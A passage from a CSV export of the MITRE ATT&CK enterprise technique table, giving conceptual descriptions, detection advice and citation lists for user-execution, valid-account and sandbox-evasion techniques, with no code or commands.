MacKeeper Bundlore Apr 2019),(Citation: FireEye NETWIRE March 2019),(Citation: TrendMicro Taidoor),(Citation: CrowdStrike Grim Spider May 2019),(Citation: ATT Sidewinder January 2021),(Citation: ESET OceanLotus),(Citation: ESET T3 Threat Report 2021),(Citation: Unit 42 TA551 Jan 2021),(Citation: McAfee Sharpshooter December 2018),(Citation: ESET Operation Spalax Jan 2021),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Talos Oblique RAT March 2021),(Citation: Mandiant Suspected Turla Campaign February 2023),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: Lazarus APT January 2022),(Citation: Unit 42 Sofacy Feb 2018),(Citation: Cybereason TA505 April 2019),(Citation: Secureworks IRON TILDEN Profile),(Citation: Trend Micro Black Basta Spotlight September 2022),(Citation: Cyber Forensicator Silence Jan 2019),(Citation: Trend Micro DRBControl February 2020),(Citation: F-Secure The Dukes),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Securelist MuddyWater Oct 2018),(Citation: Avira Mustang Panda January 2020),(Citation: Google TAG Ukraine Threat Landscape March 2022),(Citation: Medium Ali Salem Bumblebee April 2022),(Citation: Antiy CERT Ramsay April 2020),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Malwarebytes Higaisa 2020),(Citation: FireEye APT39 Jan 2019),(Citation: TrendMicro BlackTech June 2017),(Citation: Crowdstrike MUSTANG PANDA June 2018),(Citation: Securelist Darkhotel Aug 2015),(Citation: Talos Kimsuky Nov 2021),(Citation: Proofpoint TA505 October 2019),(Citation: Talos Transparent Tribe May 2021),(Citation: FireEye Obfuscation June 2017),(Citation: Cybereason Kimsuky November 2020),(Citation: FireEye APT37 Feb 2018),(Citation: Symantec Bumblebee June 2022),(Citation: Volexity Patchwork June 2018),(Citation: Microsoft Iranian Threat Actor Trends November 2021),(Citation: ClearSky Lazarus Aug 2020),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Group IB Ransomware September 2020),(Citation: Qualys LolZarus),(Citation: Malwarebytes Pony April 2016),(Citation: ProofPoint SettingContent-ms July 2018),(Citation: ATT QakBot April 2021),(Citation: CERT-EE Gamaredon January 2021),(Citation: Rancor Unit42 June 2018),(Citation: TrendMicro Msiexec Feb 2018),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Trend Micro Qakbot May 2020),(Citation: Crowdstrike Qakbot October 2020),(Citation: Unit42 Redaman January 2019),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: FireEye Hacking FIN4 Dec 2014),(Citation: Cisco Operation Layover September 2021),(Citation: McAfee REvil October 2019),(Citation: Visa FIN6 Feb 2019),(Citation: Dragos Hexane),(Citation: ThreatConnect Kimsuky September 2020),(Citation: Proofpoint TA505 Jan 2019),(Citation: FireEye APT10 April 2017),(Citation: 360 Machete Sep 2020),(Citation: ClearSky Siamesekitten August 2021),(Citation: Crowdstrike Helix Kitten Nov 2018),(Citation: Symantec Tick Apr 2016),(Citation: US-CERT TYPEFRAME June 2018),(Citation: Proofpoint TA505 Sep 2017),(Citation: Trend Micro Black Basta May 2022),(Citation: ESET Telebots Dec 2016),(Citation: Microsoft Holmium June 2020),(Citation: Google EXOTIC LILY March 2022),(Citation: Proofpoint NETWIRE December 2020),(Citation: Deep Instinct Black Basta August 2022),(Citation: ESET InvisiMole June 2020),(Citation: Anomali Static Kitten February 2021),(Citation: Gigamon Berserk Bear October 2021),(Citation: CrowdStrike Wizard Spider October 2020),(Citation: Netskope Squirrelwaffle Oct 2021),(Citation: Kroll Qakbot June 2020),(Citation: ESET Bad Rabbit),(Citation: IBM TA505 April 2020),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: eSentire FIN7 July 2021),(Citation: Cybereason Bumblebee August 2022),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: win10_asr)"
T1204.003,attack-pattern--b0c74ef9-c61e-4986-88cb-78da98a355ec,User Execution: Malicious Image,"Adversaries may rely on a user running a malicious image to facilitate execution. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be backdoored. Backdoored images may be uploaded to a public repository via [Upload Malware](https://attack.mitre.org/techniques/T1608/001), and users may then download and deploy an instance or container from the image without realizing the image is malicious, thus bypassing techniques that specifically achieve Initial Access. This can lead to the execution of malicious code, such as code that executes cryptocurrency mining, in the instance or container.(Citation: Summit Route Malicious AMIs)

Adversaries may also name images a certain way to increase the chance of users mistakenly deploying an instance or container from the image (ex: [Match Legitimate Name or Location](https://attack.mitre.org/techniques/T1036/005)).(Citation: Aqua Security Cloud Native Threat Report June 2021)",https://attack.mitre.org/techniques/T1204/003,30 March 2021,26 August 2021,enterprise-attack,1.1,Execution,"Monitor the local image registry to make sure malicious images are not added. Track the deployment of new containers, especially from newly built images. Monitor the behavior of containers within the environment to detect anomalous behavior or malicious activity after users deploy from malicious images.","Containers, IaaS","Application Log: Application Log Content, Command: Command Execution, Container: Container Creation, Container: Container Start, Image: Image Creation, Instance: Instance Creation, Instance: Instance Start",True,T1204,,"Center for Threat-Informed Defense (CTID); Vishwas Manral, McAfee",User,,,,,"(Citation: Lacework TeamTNT May 2021),(Citation: Content trust in Azure Container Registry),(Citation: Content trust in Docker)"
T1204.001,attack-pattern--ef67e13e-5598-4adc-bdb2-998225874fa9,User Execution: Malicious Link,An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). Links may also lead users to download files that require execution via [Malicious File](https://attack.mitre.org/techniques/T1204/002).,https://attack.mitre.org/techniques/T1204/001,11 March 2020,11 March 2020,enterprise-attack,1.0,Execution,"Inspect network traffic for indications that a user visited a malicious site, such as links included in phishing campaigns directed at your organization.

Anti-virus can potentially detect malicious documents and files that are downloaded from a link and executed on the user's computer.","Linux, Windows, macOS","File: File Creation, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content",True,T1204,,,User,,,,,"(Citation: FBI FLASH APT39 September 2020),(Citation: Telefonica Snip3 December 2021),(Citation: Trend Micro Muddy Water March 2021),(Citation: Unit 42 Cobalt Gang Oct 2018),(Citation: FireEye Clandestine Wolf),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: Unit 42 BackConfig May 2020),(Citation: Certfa Charming Kitten January 2021),(Citation: ESET Grandoreiro April 2020),(Citation: Zscaler Bazar September 2020),(Citation: ClearSky Kittens Back 3 August 2020),(Citation: TrendMicro EarthLusca 2022),(Citation: Secureworks IRON TWILIGHT Active Measures March 2017),(Citation: Proofpoint TA505 June 2018),(Citation: Trend Micro Banking Malware Jan 2019),(Citation: FireEye Shining A Light on DARKSIDE May 2021),(Citation: Volexity Ocean Lotus November 2020),(Citation: FireEye Hacking FIN4 Video Dec 2014),(Citation: Cyble Sidewinder September 2020),(Citation: TrendMicro Confucius APT Aug 2021),(Citation: ESET Lazarus Jun 2020),(Citation: CISA AppleJeus Feb 2021),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Trend Micro Black Basta October 2022),(Citation: Proofpoint TA416 Europe March 2022),(Citation: Proofpoint TA2541 February 2022),(Citation: Secureworks IRON RITUAL USAID Phish May 2021),(Citation: Securelist Machete Aug 2014),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: CISA AA21-200A APT40 July 2021),(Citation: Carbon Black Emotet Apr 2019),(Citation: Kaspersky MoleRATs April 2019),(Citation: Cylance Machete Mar 2017),(Citation: Symantec Elderwood Sept 2012),(Citation: Rewterz Sidewinder APT April 2020),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: FOX-IT May 2016 Mofang),(Citation: Cylance Dust Storm),(Citation: SANS Windshift August 2018),(Citation: Cybereason Cobalt Kitty 2017),(Citation: FireEye Fin8 May 2016),(Citation: MSTIC NOBELIUM May 2021),(Citation: Threatpost Hancitor),(Citation: Symantec Patchwork),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Proofpoint TA505 Mar 2018),(Citation: Trend Micro TA505 June 2019),(Citation: ESET Machete July 2019),(Citation: Unit 42 QUADAGENT July 2018),(Citation: Symantec Elfin Mar 2019),(Citation: Rewterz Sidewinder COVID-19 June 2020),(Citation: Proofpoint Bumblebee April 2022),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: CSM Elderwood Sept 2012),(Citation: Google Election Threats October 2020),(Citation: Kaspersky LuminousMoth July 2021),(Citation: Trend Micro Qakbot December 2020),(Citation: Talos Cobalt Group July 2018),(Citation: IBM Grandoreiro April 2020),(Citation: Amnesty Intl. Ocean Lotus February 2021),(Citation: Unit42 Molerat Mar 2020),(Citation: Unit 42 NETWIRE April 2020),(Citation: Kaspersky QakBot September 2021),(Citation: Proofpoint Leviathan Oct 2017),(Citation: FireEye NETWIRE March 2019),(Citation: Cybereason Bazar July 2020),(Citation: KISA Operation Muzabi),(Citation: ATT Sidewinder January 2021),(Citation: McAfee Dianxun March 2021),(Citation: ESET Operation Spalax Jan 2021),(Citation: ESET Turla Mosquito Jan 2018),(Citation: FireEye APT29 Nov 2018),(Citation: JPCert TSCookie March 2018),(Citation: US District Court Indictment GRU Oct 2018),(Citation: Talos Oblique RAT March 2021),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: McAfee Night Dragon),(Citation: Cybereason TA505 April 2019),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: FireEye APT39 Jan 2019),(Citation: Secureworks GOLD KINGSWOOD September 2018),(Citation: TrendMicro BlackTech June 2017),(Citation: Crowdstrike MUSTANG PANDA June 2018),(Citation: Proofpoint TA505 October 2019),(Citation: Talos Transparent Tribe May 2021),(Citation: FireEye Obfuscation June 2017),(Citation: ESET EvilNum July 2020),(Citation: Volexity Patchwork June 2018),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: ClearSky Lazarus Aug 2020),(Citation: Group IB Ransomware September 2020),(Citation: Malwarebytes Pony April 2016),(Citation: ProofPoint SettingContent-ms July 2018),(Citation: ATT QakBot April 2021),(Citation: FireEye APT33 Sept 2017),(Citation: Trend Micro Qakbot May 2020),(Citation: FireEye Hacking FIN4 Dec 2014),(Citation: Proofpoint TA505 Jan 2019),(Citation: Crowdstrike Helix Kitten Nov 2018),(Citation: Proofpoint TA505 Sep 2017),(Citation: Google EXOTIC LILY March 2022),(Citation: Anomali Static Kitten February 2021),(Citation: CrowdStrike Wizard Spider October 2020),(Citation: Kroll Qakbot June 2020),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: Cybereason Bumblebee August 2022),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),"
T1078.004,attack-pattern--f232fa7a-025c-4d43-abc7-318e81a73d65,Valid Accounts: Cloud Accounts,"Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud or be hybrid joined between on-premises systems and the cloud through federation with other identity sources such as Windows Active Directory. (Citation: AWS Identity Federation)(Citation: Google Federating GC)(Citation: Microsoft Deploying AD Federation)

Service or user accounts may be targeted by adversaries through [Brute Force](https://attack.mitre.org/techniques/T1110), [Phishing](https://attack.mitre.org/techniques/T1566), or various other means to gain access to the environment. Federated accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments.

An adversary may create long lasting [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication. 

Cloud accounts may also be able to assume [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005) or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through [Cloud API](https://attack.mitre.org/techniques/T1059/009) or other methods. 
",https://attack.mitre.org/techniques/T1078/004,13 March 2020,16 October 2023,enterprise-attack,1.6,"Defense Evasion, Initial Access, Persistence, Privilege Escalation","Monitor the activity of cloud accounts to detect abnormal or malicious behavior, such as accessing information outside of the normal function of the account or account usage at atypical hours.","Azure AD, Google Workspace, IaaS, Office 365, SaaS","Logon Session: Logon Session Creation, Logon Session: Logon Session Metadata, User Account: User Account Authentication",True,T1078,,"Jon Sternstein, Stern Security","Administrator, User",,,,,"(Citation: Microsoft Holmium June 2020),(Citation: Crowdstrike TELCO BPO Campaign December 2022),(Citation: Roadtools),(Citation: Microsoft NICKEL December 2021),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Mandiant APT29 Microsoft 365 2022),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Mandiant APT29 Eye Spy Email Nov 22),(Citation: CrowdStrike StellarParticle January 2022),(Citation: GitHub Pacu),(Citation: Peirates GitHub),(Citation: TechNet Least Privilege),(Citation: TechNet Credential Theft),(Citation: Microsoft Security Alerts for Azure AD Roles),(Citation: AWS - IAM Console Best Practices),(Citation: Microsoft Common Conditional Access Policies),(Citation: Microsoft Azure security baseline for Azure Active Directory)"
T1078.001,attack-pattern--6151cbea-819b-455a-9fa6-99a1cc58797d,Valid Accounts: Default Accounts,"Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS and the default service account in Kubernetes.(Citation: Microsoft Local Accounts Feb 2019)(Citation: AWS Root User)(Citation: Threat Matrix for Kubernetes)

Default accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen [Private Keys](https://attack.mitre.org/techniques/T1552/004) or credential materials to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021).(Citation: Metasploit SSH Module)",https://attack.mitre.org/techniques/T1078/001,13 March 2020,30 March 2023,enterprise-attack,1.2,"Defense Evasion, Initial Access, Persistence, Privilege Escalation","Monitor whether default accounts have been activated or logged into. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately.","Azure AD, Containers, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","Logon Session: Logon Session Creation, User Account: User Account Authentication",True,T1078,,,"Administrator, User",,,,,"(Citation: Sygnia Elephant Beetle Jan 2022),(Citation: DFIR Phosphorus November 2021),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Accenture HyperStack October 2020),(Citation: US-CERT Alert TA13-175A Risks of Default Passwords on the Internet)"
T1078.002,attack-pattern--c3d4bdd9-2cfe-4a80-9d0c-07a29ecdce8f,Valid Accounts: Domain Accounts,"Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.(Citation: TechNet Credential Theft) Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.(Citation: Microsoft AD Accounts)

Adversaries may compromise domain accounts, some with a high level of privileges, through various means such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or password reuse, allowing access to privileged resources of the domain.",https://attack.mitre.org/techniques/T1078/002,13 March 2020,14 August 2023,enterprise-attack,1.4,"Defense Evasion, Initial Access, Persistence, Privilege Escalation","Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services.(Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).

On Linux, check logs and other artifacts created by use of domain authentication services, such as the System Security Services Daemon (sssd).(Citation: Ubuntu SSSD Docs) 

Perform regular audits of domain accounts to detect accounts that may have been created by an adversary for persistence.","Linux, Windows, macOS","Logon Session: Logon Session Creation, Logon Session: Logon Session Metadata, User Account: User Account Authentication",True,T1078,,"Jon Sternstein, Stern Security","Administrator, User",,,,,"(Citation: Symantec Buckeye),(Citation: ANSSI RYUK RANSOMWARE),(Citation: NCC Group Chimera January 2021),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Crowdstrike Indrik November 2018),(Citation: FoxIT Wocao December 2019),(Citation: Microsoft Prestige ransomware October 2022),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Unit 42 Shamoon3 2018),(Citation: CobaltStrike Daddy May 2017),(Citation: Microsoft POLONIUM June 2022),(Citation: Secureworks BRONZE SILHOUETTE May 2023),(Citation: ESET Dukes October 2019),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: DFIR Phosphorus November 2021),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Bitdefender Naikon April 2021),(Citation: Dell TG-1314),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: cobaltstrike manual),(Citation: IBM TA505 April 2020),(Citation: McAfee Night Dragon),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: Microsoft Volt Typhoon May 2023),(Citation: FireEye Shamoon Nov 2016),"
T1078.003,attack-pattern--fdc47f44-dd32-4b99-af5f-209f556f63c2,Valid Accounts: Local Accounts,"Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.

Local Accounts may also be abused to elevate privileges and harvest credentials through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement. ",https://attack.mitre.org/techniques/T1078/003,13 March 2020,14 July 2023,enterprise-attack,1.4,"Defense Evasion, Initial Access, Persistence, Privilege Escalation","Perform regular audits of local system accounts to detect accounts that may have been created by an adversary for persistence. Look for suspicious account behavior, such as accounts logged in at odd times or outside of business hours.","Containers, Linux, Network, Windows, macOS","Logon Session: Logon Session Creation, Logon Session: Logon Session Metadata, User Account: User Account Authentication",True,T1078,,,"Administrator, User",,,,,"(Citation: US-CERT NotPetya 2017),(Citation: FoxIT Wocao December 2019),(Citation: Netscout Stolen Pencil Dec 2018),(Citation: FireEye Exchange Zero Days March 2021),(Citation: FireEye APT32 May 2017),(Citation: ESET Crutch December 2020),(Citation: Umbreon Trend Micro),(Citation: cobaltstrike manual),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Malwarebytes Emotet Dec 2017),(Citation: CobaltStrike Daddy May 2017),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Bitdefender StrongPity June 2020),(Citation: FireEye FIN10 June 2017),(Citation: Talos Nyetya June 2017),(Citation: TechNet Least Privilege),(Citation: Kubernetes Service Accounts),(Citation: TechNet Credential Theft),(Citation: Microsoft Remote Use of Local)"
T1497.001,attack-pattern--29be378d-262d-4e99-b00d-852d573628e6,Virtualization/Sandbox Evasion: System Checks,"Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)

Specific checks will vary based on the target and/or adversary, but may involve behaviors such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047), [PowerShell](https://attack.mitre.org/techniques/T1059/001), [System Information Discovery](https://attack.mitre.org/techniques/T1082), and [Query Registry](https://attack.mitre.org/techniques/T1012) to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. 

Checks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. 

Other common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions.(Citation: McAfee Virtual Jan 2017) In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. 
 
Hardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.(Citation: Unit 42 OilRig Sept 2018)",https://attack.mitre.org/techniques/T1497/001,06 March 2020,18 October 2021,enterprise-attack,2.1,"Defense Evasion, Discovery","Virtualization/sandbox related system checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.","Linux, Windows, macOS","Command: Command Execution, Process: OS API Execution, Process: Process Creation",True,T1497,"Anti-virus, Host forensic analysis, Signature-based detection, Static File Analysis",Deloitte Threat Library Team,,,,,,"(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: Unit 42 BadPatch Oct 2017),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: Cyphort EvilBunny Dec 2014),(Citation: Malwarebytes Dyreza November 2015),(Citation: Telefonica Snip3 December 2021),(Citation: ESET Attor Oct 2019),(Citation: Medium Ali Salem Bumblebee April 2022),(Citation: ESET OceanLotus macOS April 2019),(Citation: 20 macOS Common Tools and Techniques),(Citation: Morphisec Snip3 May 2021),(Citation: Secureworks Karagany July 2019),(Citation: Kaspersky Lab SynAck May 2018),(Citation: Microsoft Analyzing Solorigate Dec 2020),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Talos Smoke Loader July 2018),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: Microsoft FinFisher March 2018),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Talos Group123),(Citation: Palo Alto Networks Black Basta August 2022),(Citation: FireEye SUNSHUTTLE Mar 2021),(Citation: ESET Okrum July 2019),(Citation: Unit 42 OilRig Sept 2018),(Citation: HP SVCReady Jun 2022),(Citation: Cybereason Kimsuky November 2020),(Citation: ESET EvilNum July 2020),(Citation: PaloAlto UBoatRAT Nov 2017),(Citation: NCC Group WastedLocker June 2020),(Citation: ClearSky Lazarus Aug 2020),(Citation: Talos Remcos Aug 2018),(Citation: Unit 42 Lucifer June 2020),(Citation: ATT QakBot April 2021),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: ESET Grandoreiro April 2020),(Citation: Trend Micro Qakbot May 2020),(Citation: IBM MegaCortex),(Citation: SentinelLabs reversing run-only applescripts 2021),(Citation: Unit42 DarkHydrus Jan 2019),(Citation: NCCGroup RokRat Nov 2018),(Citation: Unit42 OceanLotus 2017),(Citation: ClearSky Siamesekitten August 2021),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: ASERT Donot March 2018),(Citation: Lastline DarkHotel Just In Time Decryption Nov 2015),(Citation: Kaspersky WIRTE November 2021),(Citation: SecureList SynAck Doppelgänging May 2018),(Citation: Talos Frankenstein June 2019),(Citation: Check Point Black Basta October 2022),(Citation: Unit 42 DarkHydrus July 2018),(Citation: Unit 42 WhisperGate January 2022),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Check Point APT34 April 2021),(Citation: Unit42 PlugX June 2017),(Citation: ESET InvisiMole June 2020),(Citation: Medium Eli Salem GuLoader April 2021),(Citation: Talos GravityRAT),(Citation: Talos Oblique RAT March 2021),(Citation: Symantec Dyre June 2015),(Citation: Talos PoetRAT April 2020),(Citation: GitHub Pupy),(Citation: Microsoft DUBNIUM June 2016),(Citation: Microsoft Volt Typhoon May 2023),(Citation: Securelist APT10 March 2021),"
T1497.003,attack-pattern--4bed873f-0b7d-41d4-b93a-b6905d1f90b0,Virtualization/Sandbox Evasion: Time Based Evasion,"Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.

Adversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled [Multi-Stage Channels](https://attack.mitre.org/techniques/T1104) to avoid analysis and scrutiny.(Citation: Deloitte Environment Awareness)

Benign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such as [Ping](https://attack.mitre.org/software/S0097)s, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments.(Citation: Revil Independence Day)(Citation: Netskope Nitol) Another variation, commonly referred to as API hammering, involves making various calls to [Native API](https://attack.mitre.org/techniques/T1106) functions in order to delay execution (while also potentially overloading analysis environments with junk data).(Citation: Joe Sec Nymaim)(Citation: Joe Sec Trickbot)

Adversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.(Citation: ISACA Malware Tricks)",https://attack.mitre.org/techniques/T1497/003,06 March 2020,15 October 2021,enterprise-attack,1.2,"Defense Evasion, Discovery","Time-based evasion will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection. ","Linux, Windows, macOS","Command: Command Execution, Process: OS API Execution, Process: Process Creation",True,T1497,"Anti-virus, Host forensic analysis, Signature-based detection, Static File Analysis","Deloitte Threat Library Team; Jeff Felling, Red Canary; Jorge Orchilles, SCYTHE; Ruben Dodge, @shotgunner101",,,,,,"(Citation: JoeSecurity Egregor 2020),(Citation: Medium S2W WhisperGate January 2022),(Citation: Kaspersky Tomiris Sep 2021),(Citation: Palo Alto Brute Ratel July 2022),(Citation: Trend Micro DRBControl February 2020),(Citation: Cyphort EvilBunny Dec 2014),(Citation: CISA AppleJeus Feb 2021),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Cyberint Qakbot May 2021),(Citation: Morphisec Snip3 May 2021),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: RecordedFuture WhisperGate Jan 2022),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: Symantec RAINDROP January 2021),(Citation: Unit42 BendyBear Feb 2021),(Citation: HP SVCReady Jun 2022),(Citation: ESET Okrum July 2019),(Citation: Proofpoint Bumblebee April 2022),(Citation: Kaspersky CactusPete Aug 2020),(Citation: ClearSky Lazarus Aug 2020),(Citation: Malwarebytes Pony April 2016),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: wardle evilquest parti),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Accenture MUDCARP March 2019),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: Joe Sec Trickbot),(Citation: TrendMicro Ursnif File Dec 2014),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: Talos Lokibot Jan 2021),(Citation: MDSec Brute Ratel August 2022),(Citation: Kaspersky QakBot September 2021),(Citation: Securelist APT10 March 2021),(Citation: Cybereason StrifeWater Feb 2022),(Citation: Group IB GrimAgent July 2021),(Citation: ESET Dukes October 2019),(Citation: trendmicro xcsset xcode project 2020),(Citation: Unit42 Clop April 2021),(Citation: Medium Eli Salem GuLoader April 2021),(Citation: Talos Bisonal Mar 2020),(Citation: Trustwave GoldenSpy June 2020),(Citation: NCC Group Team9 June 2020),"
T1497.002,attack-pattern--91541e7e-b969-40c6-bbd8-1b5352ec2938,Virtualization/Sandbox Evasion: User Activity Based Checks,"Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)

